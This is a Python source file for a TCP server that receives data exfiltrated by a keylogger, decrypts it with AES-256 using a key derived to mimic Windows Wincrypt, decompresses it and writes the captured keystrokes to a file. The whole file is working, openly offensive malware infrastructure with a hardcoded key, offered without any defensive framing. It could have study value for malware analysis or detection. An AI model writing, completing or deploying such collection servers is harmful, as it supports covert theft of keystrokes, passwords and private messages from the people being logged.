# Simple Python server used to receive exfilled data from a keylogger
# Data comes to server after being LZNT1 compressed and then AES256 encrypted
# Input is unencrypted, uncompressed, and written to a file in the CWD
# Expects received data to come in the following format:
#    - Packet 1: Randomly generated IV used for encryption
#    - Packet 2: Size of the exfil data
#    - Packets 3+: Compressed and encrypted data
# 
# Python 3.2+
# Required modules: pyaes, lznt1

import socketserver
import pyaes
import hashlib
import lznt1

class TCPHandler(socketserver.BaseRequestHandler):
	def handle(self):
		print("Connection established")
		done = False
		try:
			# Get IV (16 bytes) and init decryptor
			self.data = self.request.recv(16)
			print(f"IV is {self.data}")
			iv = self.data
			cbc = pyaes.AESModeOfOperationCBC(key, iv)
			decrypter = pyaes.Decrypter(cbc)
			decrypted = b''
			
			# Start with 4 bytes to get the DWORD representing the exfil size
			self.data = self.request.recv(4)
			exfil_length = int.from_bytes(self.data, 'little')
			print(f"exfil length: {exfil_length}",)
			# Then receive all the data
			self.data = self.request.recv(exfil_length)
			print(f"Received data: {self.data}")
			decrypted += decrypter.feed(self.data)
			decrypted += decrypter.feed()
			data = lznt1.decompress(decrypted).decode('utf-16')
			with open("exfil.txt", "w") as outfile:
				outfile.write(data)
			print("Exfil complete! Check exfil.txt")
		except ConnectionAbortedError or ConnectionResetError:
			print("Connection force closed by client")

# Encryption setup to mimic Wincrypt
# Python UTF-16 encoding results in two extra bytes at the front; cut them off
passwd = "ThisIsMyEncryptionKey".encode('utf-16')[2:]
sha1_passwd = hashlib.sha1(passwd).digest()
buff36 = [0x36 for i in range(64)]
buff5c = [0x5c for i in range(64)]
for i in range(len(sha1_passwd)):
	buff36[i] = buff36[i] ^ sha1_passwd[i]
	buff5c[i] = buff5c[i] ^ sha1_passwd[i]
sha1_buff36 = hashlib.sha1(bytearray(buff36)).digest()
sha1_buff5c = hashlib.sha1(bytearray(buff5c)).digest()
sha1_combined = sha1_buff36 + sha1_buff5c
key = sha1_combined[:32]
print(f"key is {key}")

# Start server listening
server = socketserver.TCPServer(("localhost", 12345), TCPHandler)
print("Server listening...")
server.serve_forever()
print("Server shutting down")